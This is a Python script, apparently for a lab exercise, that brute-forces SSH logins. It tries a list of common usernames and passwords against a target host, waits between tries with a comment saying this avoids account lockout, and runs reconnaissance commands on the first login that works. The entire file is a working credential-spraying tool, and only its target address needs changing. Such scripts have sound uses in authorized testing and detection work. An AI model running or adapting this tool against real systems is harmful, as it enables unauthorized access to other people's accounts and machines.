import paramiko
import time
import socket

# --- Configuration ---
# TARGET CONFIGURATION
# Replace with the IP/hostname of your test VM
TARGET_HOST = "192.168.44.129" 
TARGET_PORT = 22

# CREDENTIAL LISTS
# In a real scenario, these would be much larger and more targeted.
usernames = ["die","admin", "root", "user", "test", "vagrant"]
passwords = ["die", "password", "123456", "admin", "root", "vagrant", "letmein", "P@ssw0rd"]

# COMMAND TO EXECUTE ON SUCCESSFUL LOGIN
# This simulates an attacker running reconnaissance.
COMMAND_TO_RUN = "whoami && id && uname -a"

# --- Attack Simulation Logic ---

def attempt_ssh_login(host, port, username, password):
    """
    Attempts to log into an SSH server with a single set of credentials.
    Returns True on success, False on failure.
    """
    client = paramiko.SSHClient()
    # Automatically add the server's host key (insecure, but common for testing)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        print(f"    [+] Trying {username}:{password}")
        client.connect(hostname=host, port=port, username=username, password=password, timeout=5)
        # If connect() succeeds without an exception, login was successful.
        print(f"    [SUCCESS] Login successful for {username}:{password}")
        return True, client
    except paramiko.AuthenticationException:
        # Authentication failed, credentials are wrong.
        return False, None
    except socket.timeout:
        # Host is unreachable or port is closed.
        print(f"    [!] Connection to {host}:{port} timed out.")
        return False, None
    except Exception as e:
        # Other errors (e.g., connection refused, SSH protocol issues)
        print(f"    [!] An error occurred: {e}")
        return False, None

def execute_command_on_target(ssh_client, command):
    """
    Executes a command on the remote system using the active SSH client.
    """
    print("\n[*] --- Executing Command on Target ---")
    print(f"[*] Running command: {command}")
    stdin, stdout, stderr = ssh_client.exec_command(command)
    
    print("[*] Command Output:")
    print(stdout.read().decode().strip())
    
    error_output = stderr.read().decode().strip()
    if error_output:
        print("[!] Command Errors:")
        print(error_output)
    print("[*] --- Command Execution Finished ---\n")

def main():
    """
    Main function to run the credential access simulation.
    """
    print("--- T1078: Valid Accounts - Credential Spraying Simulation ---")
    print(f"[*] Target: {TARGET_HOST}:{TARGET_PORT}")
    print(f"[*] Starting credential testing...\n")
    
    successful_client = None
    found_creds = None
    
    # Iterate through all username and password combinations
    for user in usernames:
        for pwd in passwords:
            success, client = attempt_ssh_login(TARGET_HOST, TARGET_PORT, user, pwd)
            
            if success:
                successful_client = client
                found_creds = (user, pwd)
                break # Found a valid pair, exit the inner loop
        if successful_client:
            break # Found a valid pair, exit the outer loop
        
        # Add a small delay to avoid triggering account lockout policies
        time.sleep(1) 
    
    if successful_client:
        print("\n[+] --- VALID CREDENTIALS FOUND ---")
        print(f"[+] Credentials: {found_creds[0]}:{found_creds[1]}")
        print("[+] Gaining initial foothold...")
        
        # Simulate the attacker using the valid credentials to execute a command
        execute_command_on_target(successful_client, COMMAND_TO_RUN)
        
        # Clean up the connection
        successful_client.close()
        print("[*] Session closed.")
        
    else:
        print("\n[-] --- NO VALID CREDENTIALS FOUND ---")
        print("[-] Could not find a working username/password pair.")
        print("[-] This could mean the target is down, the port is closed,")
        print("[-] or none of the provided credentials were correct.")

if __name__ == "__main__":
    # You need to install the paramiko library first:
    # pip install paramiko
    main()